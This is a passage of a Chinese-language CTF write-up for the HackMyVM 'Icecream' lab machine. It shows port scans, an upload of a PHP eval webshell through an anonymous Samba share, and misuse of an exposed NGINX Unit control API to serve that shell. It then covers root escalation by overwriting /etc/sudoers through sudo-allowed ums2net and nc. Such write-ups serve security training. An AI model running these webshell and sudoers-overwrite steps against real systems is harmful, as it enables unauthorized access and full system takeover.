class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>error<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>Invalid\\x20method\\.<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>}<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>\"</span>)<span class=\"hljs-operator\">%</span>r(                                        \nSF:<span class=\"hljs-type\">FourOhFourRequest</span>,<span class=\"hljs-type\">C3</span>,<span class=\"hljs-string\">\"HTTP/1\\.1\\x20404\\x20Not\\x20Found<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Server:\\x20Un                                        \nSF:it/1\\.33\\.0<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Date:\\x20Fri,\\x2028\\x20Feb\\x202025\\x2013:09:59\\x20GMT<span class=\"hljs-subst\">\\r</span>\\                                        \nSF:nContent-Type:\\x20application/json<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Content-Length:\\x2040<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Connecti                                        \nSF:on:\\x20close<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>error<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>Value\\x20doesn't\\x20exist\\.\\                                        \nSF:\"</span>\\r\\n}\\r\\n<span class=\"hljs-string\">\");                                                                                                  \nMAC Address: 08:00:27:11:12:1D (Oracle VirtualBox virtual NIC)                                                    \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port             \nDevice type: general purpose      \nRunning: Linux 4.X|5.X                     \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                   \nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop              \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n                                                         \nHost script results:                \n| smb2-security-mode:                    \n|   3:1:1:                          \n|_    Message signing enabled but not required\n|_clock-skew: -3s                                                                                                                                                                                                                   \n| smb2-time:                                                                                                      \n|   date: 2025-02-28T13:10:00                                                                                     \n|_  start_date: N/A                                                                                               \n|_nbstat: NetBIOS name: ICECREAM, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: &#x3C;unknown> (unknown)                       \n                                                                                                                  \nTRACEROUTE                                                                                                        \nHOP RTT     ADDRESS                                                                                               \n1   0.48 ms 192.168.56.39                                                                                         \n                                                                                                                  \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .             \nNmap done: 1 IP address (1 host up) scanned in 23.15 seconds                               \n</span></code></pre>\n<p>一开始看端口还以为是<code>windows</code>主机，看了版本发现是<code>samba</code>服务</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -script=vuln -p 22,80,139,445,9000 192.168.56.39                        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 08:14 EST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.39\nHost is up (0.00037s latency).\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n9000/tcp open  cslistener\nMAC Address: 08:00:27:11:12:1D (Oracle VirtualBox virtual NIC)\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]\n\nNmap done: 1 IP address (1 host up) scanned in 106.09 seconds\n</span></code></pre>\n<p><code>smaba</code>尝试匿名用户</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  smbclient -L 192.168.56.39 -U anonymous                      \nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        <span class=\"hljs-built_in\">print</span>$          Disk      Printer Drivers\n        icecream        Disk      tmp Folder\n        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)\n        nobody          Disk      Home Directories\nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\nsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\nProtocol negotiation to server 192.168.56.39 (<span class=\"hljs-keyword\">for</span> a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p>但是没有任何有效数据</p>\n<p>我们再去看新鲜的<code>9000</code>端口，这似乎是 <strong>NGINX Unit</strong> 的配置或状态信息。NGINX Unit 是一个轻量级的应用服务器，支持多种编程语言（如 Python、PHP、Perl、Ruby、Java 等），并且可以动态配置，无需重启服务</p>\n<pre><code class=\"hljs language-bash\">{                                                                                                                                                                                                                                   \n        <span class=\"hljs-string\">\"certificates\"</span>: {},                              \n        <span class=\"hljs-string\">\"js_modules\"</span>: {},                                \n        <span class=\"hljs-string\">\"config\"</span>: {                                      \n                <span class=\"hljs-string\">\"listeners\"</span>: {},                                                                                  \n                <span class=\"hljs-string\">\"routes\"</span>: [],                                                                                     \n                <span class=\"hljs-string\">\"applications\"</span>: {}                                                                                \n        },                                                                                                        \n                                                                                                                  \n        <span class=\"hljs-string\">\"status\"</span>: {                                      \n                <span class=\"hljs-string\">\"modules\"</span>: {                             \n                        <span class=\"hljs-string\">\"python\"</span>: {                                                                               \n                                <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"3.11.2\"</span>,                                                              \n                                <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/python3.11.unit.so\"</span>                                                                                                                                                   \n                        },                               \n                                                                                                                  \n                        <span class=\"hljs-string\">\"php\"</span>: {                                                                                  \n                                <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"8.2.18\"</span>,                                                              \n                                <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/php.unit.so\"</span>     \n                        },                                                                                        \n                                                                                                                  \n                        <span class=\"hljs-string\">\"perl\"</span>: {                                                                                 \n                                <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"5.36.0\"</span>,                                                                                                                                                                                \n                                <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/perl.unit.so\"</span>                                                                                                                                                         \n                        },                                                                                                                                                                                                          \n                                                                                                                  \n                        <span class=\"hljs-string\">\"ruby\"</span>: {                                                                                 \n                                <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"3.1.2\"</span>,                                                               \n                                <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/ruby.unit.so\"</span>                                                                                                                                                         \n                        },                                                                                                                                                                                                          \n                                                                                                                  \n                        <span class=\"hljs-string\">\"java\"</span>: {                                                                                                                                                                                                   \n                                <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"17.0.11\"</span>,                                                                                                                                                                               \n                                <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/java17.unit.so\"</span>                                                                                                                                                       \n                        },                                                                                        \n                                                                                                                  \n                        <span class=\"hljs-string\">\"wasm\"</span>: {                                                                                 \n                                <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"0.1\"</span>,                                                                                                                                                                                   \n                                <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/wasm.unit.so\"</span>                                                                                                                                                         \n                        },                                                                                                                                                                                                          \n                                                         \n                        <span class=\"hljs-string\">\"wasm-wasi-component\"</span>: {                                                                  \n                                <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"0.1\"</span>,                                                                                                                                                                                   \n                                <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/wasm_wasi_component.unit.so\"</span>                                                                                                                                          \n                        }                                                                                                                                                                                                           \n                },                                                                                                \n                                                                                                                                                                                                                                    \n                <span class=\"hljs-string\">\"connections\"</span>: {                                                                                  \n                        <span class=\"hljs-string\">\"accepted\"</span>: 0,                                                                            \n                        <span class=\"hljs-string\">\"active\"</span>: 0,                                                                              \n                        <span class=\"hljs-string\">\"idle\"</span>: 0,                                                                                \n                        <span class=\"hljs-string\">\"closed\"</span>: 0                                                                               \n                },                                                                                                \n                                                                                                                  \n                <span class=\"hljs-string\">\"requests\"</span>: {                                                                                                                                                                                                       \n                        <span class=\"hljs-string\">\"total\"</span>: 0                                                                                \n                },                                                                                                                                                                                                                  \n                                                         \n                <span class=\"hljs-string\">\"applications\"</span>: {}                                                                                \n        }                                                                                                         \n}                                                                                                               \n</code></pre>\n<p>扫一下目录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/icecream/samba  gobuster <span class=\"hljs-built_in\">dir</span> -u 192.168.56.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x zip,txt,html,php,asp                                 \n\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.39\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,403,502,429\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,html,php,asp,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\nProgress: 1323360 / 1323366 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/icecream/samba  gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.39:9000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x zip,txt,html,php,asp\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.39:9000\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   429,404,403,502\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,txt,html,php,asp\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/status               (Status: 200) [Size: 862]\n/config               (Status: 200) [Size: 62]\n/certificates         (Status: 200) [Size: 4]\n</code></pre>\n<h2>samba</h2>\n<p>尝试了<code>samba</code>多个漏洞利用无效，但是尝试上传文件成功了..</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/icecream  vim phpinfo.php   \n⚡ root@kali  ~/Desktop/test/icecream  smbclient //192.168.56.39/icecream -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> put phpinfo.php \nputting file phpinfo.php as \\phpinfo.php (3.9 kb/s) (average 3.9 kb/s)\n</code></pre>\n<p>还能成功执行</p>\n<p><img src=\"/post-images/HackMyVMIcecream/image140.png\" alt=\"image.png\"></p>\n<p>上传一句话木马，蚁🗡连接</p>\n<p><img src=\"/post-images/HackMyVMIcecream/image141.png\" alt=\"image.png\"></p>\n<p>但是没找到有什么信息，并且存在<code>ice</code>用户</p>\n<h2>Nginx UNIT</h2>\n<p>没思路，找一下<code>Nginx UNIT</code>相关信息，官网：<a href=\"https://github.com/nginx/unit\">https://github.com/nginx/unit</a></p>\n<p>以下为官网原文：</p>\n<p>Suppose you saved a PHP script as <code>/www/helloworld/index.php</code>:</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-meta\">&#x3C;?php</span> <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"Hello, PHP on Unit!\"</span>; <span class=\"hljs-meta\">?></span>\n</code></pre>\n<p>To run it on Unit with the <code>unit-php</code> module installed, first set up an application object. Let's store our first config snippet in a file called <code>config.json</code>:</p>\n<pre><code class=\"hljs language-json\"><span class=\"hljs-punctuation\">{</span>\n    <span class=\"hljs-attr\">\"helloworld\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">{</span>\n        <span class=\"hljs-attr\">\"type\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"php\"</span><span class=\"hljs-punctuation\">,</span>\n        <span class=\"hljs-attr\">\"root\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"/www/helloworld/\"</span>\n    <span class=\"hljs-punctuation\">}</span>\n<span class=\"hljs-punctuation\">}</span>\n</code></pre>\n<p>Saving it as a file isn't necessary, but can come in handy with larger objects.</p>\n<p>Now, <code>PUT</code> it into the <code>/config/applications</code> section of Unit's control API, usually available by default via a Unix domain socket:</p>\n<pre><code class=\"hljs language-css\"># curl -<span class=\"hljs-attribute\">X</span> PUT <span class=\"hljs-attr\">--data-binary</span> <span class=\"hljs-keyword\">@config</span>.json --unix-socket  \\\n       /path/to/control.unit.sock <span class=\"hljs-attribute\">http</span>://localhost/config/applications\n</code></pre>\n<pre><code class=\"hljs language-json\"><span class=\"hljs-punctuation\">{</span>\n\t<span class=\"hljs-attr\">\"success\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"Reconfiguration done.\"</span>\n<span class=\"hljs-punctuation\">}</span>\n</code></pre>\n<p>Next, reference the app from a listener object in the <code>/config/listeners</code> section of the API. This time, we pass the config snippet straight from the command line:</p>\n<pre><code class=\"hljs language-swift\"># curl <span class=\"hljs-operator\">-</span><span class=\"hljs-type\">X</span> <span class=\"hljs-type\">PUT</span> <span class=\"hljs-operator\">-</span>d '{<span class=\"hljs-string\">\"127.0.0.1:8080\"</span>: {<span class=\"hljs-string\">\"pass\"</span>: <span class=\"hljs-string\">\"applications/helloworld\"</span>}}'  \\\n       <span class=\"hljs-operator\">--</span>unix<span class=\"hljs-operator\">-</span>socket <span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/control.unit.sock http:/</span><span class=\"hljs-regexp\">/localhost/</span>config<span class=\"hljs-operator\">/</span>listeners\n</code></pre>\n<pre><code class=\"hljs language-json\"><span class=\"hljs-punctuation\">{</span>\n    <span class=\"hljs-attr\">\"success\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"Reconfiguration done.\"</span>\n<span class=\"hljs-punctuation\">}</span>\n</code></pre>\n<p>Now Unit accepts requests at the specified IP and port, passing them to the application process. Your app works!</p>\n<pre><code class=\"hljs language-csharp\">$ curl <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">8080</span>\n\n      Hello, PHP <span class=\"hljs-keyword\">on</span> Unit!\n</code></pre>\n<p>Finally, query the entire <code>/config</code> section of the control API:</p>\n<pre><code class=\"hljs language-css\"># curl <span class=\"hljs-attr\">--unix-socket</span> /<span class=\"hljs-selector-tag\">path</span>/<span class=\"hljs-selector-tag\">to</span>/control<span class=\"hljs-selector-class\">.unit</span><span class=\"hljs-selector-class\">.sock</span> http://localhost/config/\n</code></pre>\n<p>Unit's output should contain both snippets, neatly organized:</p>\n<pre><code class=\"hljs language-bash\">{\n    <span class=\"hljs-string\">\"listeners\"</span>: {\n        <span class=\"hljs-string\">\"127.0.0.1:8080\"</span>: {\n            <span class=\"hljs-string\">\"pass\"</span>: <span class=\"hljs-string\">\"applications/helloworld\"</span>\n        }\n    },\n\n    <span class=\"hljs-string\">\"applications\"</span>: {\n        <span class=\"hljs-string\">\"helloworld\"</span>: {\n            <span class=\"hljs-string\">\"type\"</span>: <span class=\"hljs-string\">\"php\"</span>,\n            <span class=\"hljs-string\">\"root\"</span>: <span class=\"hljs-string\">\"/www/helloworld/\"</span>\n        }\n    }\n}\n</code></pre>\n<p>貌似可以利用，我们指定上传的一句话木马</p>\n<p>新建<code>config.json</code></p>\n<pre><code class=\"hljs language-bash\">⚡root@kali  ~  <span class=\"hljs-built_in\">cat</span> config.json                                        \n{\n    <span class=\"hljs-string\">\"shell\"</span>: {\n        <span class=\"hljs-string\">\"type\"</span>: <span class=\"hljs-string\">\"php\"</span>,\n        <span class=\"hljs-string\">\"root\"</span>: <span class=\"hljs-string\">\"/tmp/\"</span>\n    }\n}\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  curl -X PUT --data-binary @config.json http://192.168.56.39:9000/config/applications\n{\n        <span class=\"hljs-string\">\"success\"</span>: <span class=\"hljs-string\">\"Reconfiguration done.\"</span>\n}\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  curl -X PUT -d <span class=\"hljs-string\">'{\"192.168.56.39:8080\": {\"pass\": \"applications/shell\"}}'</span> http://192.168.56.39:9000/config/listeners\n{\n        <span class=\"hljs-string\">\"success\"</span>: <span class=\"hljs-string\">\"Reconfiguration done.\"</span>\n}\n</code></pre>\n<p>再次访问<code>9000</code>端口，可以看到我们的配置成功了</p>\n<p><img src=\"/post-images/HackMyVMIcecream/image142.png\" alt=\"image.png\"></p>\n<p>访问<code>8080</code>端口</p>\n<p><img src=\"/post-images/HackMyVMIcecream/image143.png\" alt=\"image.png\"></p>\n<p>成功获得<code>ice</code>用户</p>\n<h2>提权</h2>\n<p>使用蚁🗡连接后，在家目录下可以找到UserFlag</p>\n<pre><code class=\"hljs language-bash\">(ice:/home/ice) $ <span class=\"hljs-built_in\">cat</span> user.txt\nHMVaneraseroflove\n</code></pre>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\">(ice:/home/ice) $ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> ice on icecream:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\nUser ice may run the following commands on icecream:\n    (ALL) NOPASSWD: /usr/sbin/ums2net\n</code></pre>\n<p>可以以<code>root</code>权限执行<code>ums2net</code> ，但是没见过</p>\n<blockquote>\n<p><a href=\"https://github.com/grandpaul/ums2net\">https://github.com/grandpaul/ums2net</a> | <a href=\"https://manpages.debian.org/bookworm/ums2net/ums2net.8.en.html\">https://manpages.debian.org/bookworm/ums2net/ums2net.8.en.html</a></p>\n</blockquote>\n<p><strong>How to use ums2net</strong></p>\n<ol>\n<li>Insert the USB Mass Storage. Check /dev/disk/by-id/ for the unique path for that device.</li>\n<li>Create a config file base on the above path. Please see the config file format section.</li>\n<li>Run \"ums2net -c \". ums2net will become a daemon in the background. For debugging please add \"-d\" option to avoid detach.</li>\n<li>Use nc to write your image to the USB Mass Storage device. For example, \"nc -N localhost 29543 &#x3C; warp7.img\"</li>\n</ol>\n<p><strong>Config file</strong></p>\n<p>Each line in the config file maps a TCP port to a device. All the options are separated by space. The first argument is a number represents the TCP port. And the rest of the arguments are in dd-style. For example,</p>\n<p>A line in the config file:</p>\n<pre><code class=\"hljs language-arduino\"><span class=\"hljs-string\">\"29543 of=/dev/disk/by-id/usb-Linux_UMS_disk_0_WaRP7-0x2c98b953000003b5-0:0 bs=4096\"</span>\n</code></pre>\n<p>利用思路：</p>\n<ol>\n<li>\n<p>靶机</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"1\"</span> > test.txt\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"29543 of=/tmp/test.txt\"</span> > config\n<span class=\"hljs-built_in\">sudo</span> ums2net -c config\n</code></pre>\n</li>\n<li>\n<p>Kali</p>\n<pre><code class=\"hljs language-bash\">nc 192.168.56.39:29543 &#x3C; s.php\n</code></pre>\n</li>\n<li>\n<p>靶机查看<code>test.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> test.txt\n&#x3C;?php @<span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'cmd'</span>]);?>\n</code></pre>\n</li>\n</ol>\n<p>能实现覆盖，那我们直接修改<code>sudoer</code>文件</p>\n<ol>\n<li>\n<p>靶机</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"29540 of=/etc/sudoers\"</span> > config\n<span class=\"hljs-built_in\">sudo</span> ums2net -c config\n</code></pre>\n</li>\n<li>\n<p>Kali</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'ice ALL=(ALL) NOPASSWD: ALL'</span>|nc 192.168.56.39 29540\n</code></pre>\n</li>\n<li>\n<p>靶机</p>\n<pre><code class=\"hljs language-bash\">ice@icecream:/tmp$ <span class=\"hljs-built_in\">sudo</span> su -\n<span class=\"hljs-built_in\">sudo</span> su -\n/etc/sudoers:2:11: error de sintaxis\n with the <span class=\"hljs-string\">'visudo'</span> <span class=\"hljs-built_in\">command</span> as root.\n          ^~~~~~~~\n<span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) grupos=0(root)\n</code></pre>\n</li>\n<li>\n<p>RootFlag</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> /root/root.txt\nHMViminvisible\n</code></pre>\n</li>\n</ol>","title":"HackMyVM - Icecream","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Icecream.\n\n \n \n\nNotes：Hack and fun!\n\n前期踩点\n\n`192.168.56.39`是靶机\n\n\n\n\n\n\n\n一开始看端口还以为是`windows`主机，看了版本发现是`samba`服务\n\n\n\n`smaba`尝试匿名用户\n\n\n\n但是没有任何有效数据\n\n我们再去看新鲜的`9000`端口，这似乎是 NGINX Unit 的配置或状态信息。NGINX Unit 是一个轻量级的..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}